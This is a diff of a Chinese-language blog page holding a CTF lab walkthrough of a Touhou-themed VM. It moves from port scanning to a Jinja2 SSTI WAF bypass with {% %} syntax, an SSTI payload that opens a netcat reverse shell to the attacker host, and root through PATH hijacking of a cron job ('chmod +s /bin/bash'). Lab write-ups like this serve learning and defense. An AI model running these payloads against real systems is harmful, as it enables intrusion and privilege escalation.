@@ -198,16 +198,16 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
     <div id="content">
 <div class="markdown-body" id="postBody"><h1>一、信息收集</h1>
 <p>进行网段扫描，发现目标主机：</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ sudo arp-scan -l
 ...
 192.168.205.171 08:00:27:7e:d4:57       PCS Systemtechnik GmbH
 ...
 </code></pre>
-<p>确定目标IP为 <code class="notranslate">192.168.205.171</code></p>
+<p>确定目标IP为 <code>192.168.205.171</code></p>
 <h1>二、端口扫描</h1>
 <p>对目标进行全端口扫描：</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ nmap -p0-65535 192.168.205.171
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-08 10:35 GMT
 Nmap scan report for 192.168.205.171
@@ -230,12 +230,12 @@ Nmap done: 1 IP address (1 host up) scanned in 1.21 seconds
 <h1>三、Web服务探测</h1>
 <h2>3.1 80端口分析</h2>
 <p>访问80端口得到简单的index页面：</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ curl 192.168.205.171                                            
 index
 </code></pre>
 <p>使用dirsearch进行目录扫描：</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ dirsearch -q -u 192.168.205.171          
 [10:36:19] 403 -  280B  - http://192.168.205.171/.ht_wsr.txt
 ...
@@ -245,13 +245,13 @@ index
 <p>80端口无有价值信息，转向5000端口。</p>
 <h2>3.2 5000端口分析</h2>
 <p>访问5000端口发现有趣内容：</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ curl http://192.168.205.171:5000      
 &lt;!DOCTYPE html&gt;
 &lt;html&gt;
-&lt;html lang="en"&gt;
+&lt;html lang=&quot;en&quot;&gt;
 &lt;head&gt;
-    &lt;meta charset="UTF-8"&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
 &lt;/head&gt;
 
 &lt;body&gt;
@@ -266,24 +266,24 @@ index
         &lt;br&gt;
         &lt;p1&gt;你能帮魔理沙回一趟家并且找到那本写有破解魔法的书吗&lt;/p1&gt;
         &lt;br&gt;
-&lt;img src="/static/1.png"&gt;
+&lt;img src=&quot;/static/1.png&quot;&gt;
 
 &lt;/body&gt;
 &lt;/html&gt; 
 </code></pre>
 <p>对5000端口进行目录扫描：</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ dirsearch -q -u 192.168.205.171:5000
 ...
 [10:36:56] 400 -  167B  - http://192.168.205.171:5000/console
 [10:36:58] 200 -  179B  - http://192.168.205.171:5000/home
 [10:36:59] 200 -  194B  - http://192.168.205.171:5000/library
 </code></pre>
-<p>发现三个关键路径：<code class="notranslate">/console</code>、<code class="notranslate">/home</code>、<code class="notranslate">/library</code></p>
+<p>发现三个关键路径：<code>/console</code>、<code>/home</code>、<code>/library</code></p>
 <h1>四、漏洞发现与利用</h1>
 <h2>4.1 获取破解信息</h2>
-<p>访问 <code class="notranslate">/home</code> 路径获得重要提示：</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+<p>访问 <code>/home</code> 路径获得重要提示：</p>
+<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ curl http://192.168.205.171:5000/home
 这种魔法叫ssti
 破解这种魔法的魔法阵为touhou
@@ -293,12 +293,12 @@ index
 <p>从提示中得知：</p>
 <ul>
 <li>存在SSTI（Server-Side Template Injection）漏洞</li>
-<li>参数名为 <code class="notranslate">touhou</code></li>
-<li>需要在 <code class="notranslate">/library</code> 处利用</li>
+<li>参数名为 <code>touhou</code></li>
+<li>需要在 <code>/library</code> 处利用</li>
 </ul>
 <h2>4.2 SSTI漏洞测试</h2>
-<p>访问 <code class="notranslate">/library</code> 并尝试SSTI payload：</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+<p>访问 <code>/library</code> 并尝试SSTI payload：</p>
+<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ curl http://192.168.205.171:5000/library
 &lt;!DOCTYPE html&gt;
 &lt;html&gt;
@@ -309,7 +309,7 @@ index
 &lt;/html&gt;   
 </code></pre>
 <p>尝试基础SSTI测试，发现存在WAF：</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ curl -g 'http://192.168.205.171:5000/library?touhou={{7*7}}'
 &lt;!DOCTYPE html&gt;
 ...
@@ -317,42 +317,42 @@ index
 ...
 &lt;/html&gt; 
 </code></pre>
-<p>双大括号 <code class="notranslate">{{}}</code> 被WAF拦截，尝试使用Jinja2模板语法绕过：</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+<p>双大括号 <code>{{}}</code> 被WAF拦截，尝试使用Jinja2模板语法绕过：</p>
+<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ curl 'http://192.168.205.171:5000/library?touhou=%7B%25%20set%20x%3D7*7%20%25%7D%7B%25%20print%28x%29%20%25%7D'
 49                                                                               
 </code></pre>
-<p>成功绕过WAF！使用的payload为：<code class="notranslate">{% set x=7*7 %}{% print(x) %}</code></p>
+<p>成功绕过WAF！使用的payload为：<code>{% set x=7*7 %}{% print(x) %}</code></p>
 <blockquote>
-<p><strong>技术要点：</strong> 当SSTI中的 <code class="notranslate">{{}}</code> 语法被WAF拦截时，可以尝试使用 <code class="notranslate">{% %}</code> 语法绕过。这是Jinja2模板引擎的另一种语法形式。</p>
+<p><strong>技术要点：</strong> 当SSTI中的 <code>{{}}</code> 语法被WAF拦截时，可以尝试使用 <code>{% %}</code> 语法绕过。这是Jinja2模板引擎的另一种语法形式。</p>
 </blockquote>
 <h2>4.3 获取反向Shell</h2>
 <p>构造反向Shell payload。首先在本地监听：</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ nc -lvnp 8888               
 listening on [any] 8888 ...
 </code></pre>
 <p>利用Python SSTI执行系统命令：</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ curl -g 'http://192.168.205.171:5000/library?touhou=%7B%25%20set%20x%3D%28%29.__class__.__bases__%5B0%5D.__subclasses__%28%29%5B104%5D.__init__.__globals__%5B%27sys%27%5D.modules%5B%27os%27%5D.popen%28%27busybox%20nc%20192.168.205.128%208888%20-e%20/bin/bash%27%29%20%25%7D'
 </code></pre>
 <p>成功获得反向连接：</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">connect to [192.168.205.128] from (UNKNOWN) [192.168.205.171] 43664
+<pre lang="bash"><code>connect to [192.168.205.128] from (UNKNOWN) [192.168.205.171] 43664
 id
 uid=1000(marisa) gid=1000(marisa) groups=1000(marisa)
 </code></pre>
 <blockquote>
 <p><strong>Payload详解：</strong></p>
 <ul>
-<li><code class="notranslate">().__class__.__bases__[0]</code> - 获取object基类</li>
-<li><code class="notranslate">.__subclasses__()[104]</code> - 获取subprocess.Popen类（索引可能需要调整）</li>
-<li><code class="notranslate">.__init__.__globals__['sys'].modules['os']</code> - 通过全局变量获取os模块</li>
-<li><code class="notranslate">.popen()</code> - 执行系统命令</li>
+<li><code>().__class__.__bases__[0]</code> - 获取object基类</li>
+<li><code>.__subclasses__()[104]</code> - 获取subprocess.Popen类（索引可能需要调整）</li>
+<li><code>.__init__.__globals__['sys'].modules['os']</code> - 通过全局变量获取os模块</li>
+<li><code>.popen()</code> - 执行系统命令</li>
 </ul>
 </blockquote>
 <h1>五、Shell稳定化</h1>
 <p>使用标准方法稳定Shell：</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">script /dev/null -c bash
+<pre lang="bash"><code>script /dev/null -c bash
 Ctrl+Z
 stty raw -echo; fg
 reset xterm
@@ -363,7 +363,7 @@ stty rows 36 columns 178
 <h1>六、权限提升</h1>
 <h2>6.1 系统信息收集</h2>
 <p>检查当前用户权限：</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">marisa@Crontab:~$ id
+<pre lang="bash"><code>marisa@Crontab:~$ id
 uid=1000(marisa) gid=1000(marisa) groups=1000(marisa)
 marisa@Crontab:~$ sudo -l
 sudo: unable to resolve host Crontab: Name or service not known
@@ -372,13 +372,13 @@ sudo: a password is required
 </code></pre>
 <h2>6.2 寻找提权向量</h2>
 <p>检查SUID文件和用户文件：</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">marisa@Crontab:~$ find / -perm -4000 -type f -exec ls -l {} \; 2&gt;/dev/null
+<pre lang="bash"><code>marisa@Crontab:~$ find / -perm -4000 -type f -exec ls -l {} \; 2&gt;/dev/null
 -rwsr-xr-x 1 root root 44528 Jul 27  2018 /usr/bin/chsh
 -rwsr-xr-x 1 root root 54096 Jul 27  2018 /usr/bin/chfn
 ...
 </code></pre>
 <p>检查当前用户拥有的文件时发现关键信息：</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">marisa@Crontab:~$ find / -user $(whoami) ! -path '/proc/*' ! -path '/sys/*' ! -path '/run/*' 2&gt;/dev/null
+<pre lang="bash"><code>marisa@Crontab:~$ find / -user $(whoami) ! -path '/proc/*' ! -path '/sys/*' ! -path '/run/*' 2&gt;/dev/null
 ...
 /usr/local/bin/irc_bot.py
 ...
@@ -387,13 +387,13 @@ sudo: a password is required
 </code></pre>
 <h2>6.3 发现定时任务漏洞</h2>
 <p>检查系统定时任务：</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">marisa@Crontab:~$ cat /etc/crontab
+<pre lang="bash"><code>marisa@Crontab:~$ cat /etc/crontab
 # /etc/crontab: system-wide crontab
 ...
 * * * * * root master_spark
 </code></pre>
-<p>发现每分钟执行的定时任务 <code class="notranslate">master_spark</code>，进一步分析：</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">marisa@Crontab:~$ find / -name 'master_spark' 2&gt;/dev/null
+<p>发现每分钟执行的定时任务 <code>master_spark</code>，进一步分析：</p>
+<pre lang="bash"><code>marisa@Crontab:~$ find / -name 'master_spark' 2&gt;/dev/null
 /usr/bin/master_spark
 marisa@Crontab:~$ ls -al /usr/bin/master_spark
 -rwxr--r-- 1 root root 31 Sep  8 03:48 /usr/bin/master_spark
@@ -402,21 +402,21 @@ marisa@Crontab:~$ strings /usr/bin/master_spark
 echo daze &gt; /hello
 </code></pre>
 <p>检查PATH环境变量和相关目录权限：</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">marisa@Crontab:~$ echo $PATH
+<pre lang="bash"><code>marisa@Crontab:~$ echo $PATH
 /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 marisa@Crontab:~$ ls -al /usr/local/sbin
 total 8
 drwxrwxrwx  2 root root 4096 Sep  8 03:39 .
 drwxr-xr-x 10 root root 4096 Mar 18 20:26 ..
 </code></pre>
-<p><strong>关键发现：</strong> <code class="notranslate">/usr/local/sbin</code> 目录对所有用户可写，且在PATH中优先级较高！</p>
+<p><strong>关键发现：</strong> <code>/usr/local/sbin</code> 目录对所有用户可写，且在PATH中优先级较高！</p>
 <h2>6.4 PATH劫持攻击</h2>
 <p>利用PATH劫持创建同名恶意文件：</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">marisa@Crontab:~$ echo 'chmod +s /bin/bash' &gt; /usr/local/sbin/master_spark
+<pre lang="bash"><code>marisa@Crontab:~$ echo 'chmod +s /bin/bash' &gt; /usr/local/sbin/master_spark
 marisa@Crontab:~$ chmod +x /usr/local/sbin/master_spark
 </code></pre>
 <p>等待定时任务执行：</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">marisa@Crontab:~$ ls -al /bin/bash
+<pre lang="bash"><code>marisa@Crontab:~$ ls -al /bin/bash
 -rwxr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash
 # 等待一分钟后
 marisa@Crontab:~$ ls -al /bin/bash
@@ -428,17 +428,18 @@ marisa@Crontab:~$ ls -al /bin/bash
 <ul>
 <li>PATH劫持利用了程序查找的优先级机制</li>
 <li>当程序没有使用绝对路径时，会按PATH顺序搜索</li>
-<li><code class="notranslate">/usr/local/sbin</code> 在 <code class="notranslate">/usr/bin</code> 之前，因此优先执行我们的恶意脚本</li>
+<li><code>/usr/local/sbin</code> 在 <code>/usr/bin</code> 之前，因此优先执行我们的恶意脚本</li>
 </ul>
 </blockquote>
 <h2>6.5 获取Root权限</h2>
 <p>使用SUID bash获取root权限：</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">marisa@Crontab:~$ bash -p
+<pre lang="bash"><code>marisa@Crontab:~$ bash -p
 bash-5.0# cat /root/root.txt /home/marisa/user.txt 
 flag{touhou sai gao}
 flag{marisa marisa-master spark}
 </code></pre>
-<p>成功获取两个flag！</p></div>
+<p>成功获取两个flag！</p>
+</div>
 <div style="font-size:small;margin-top:8px;float:right;"></div>
 
 <button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
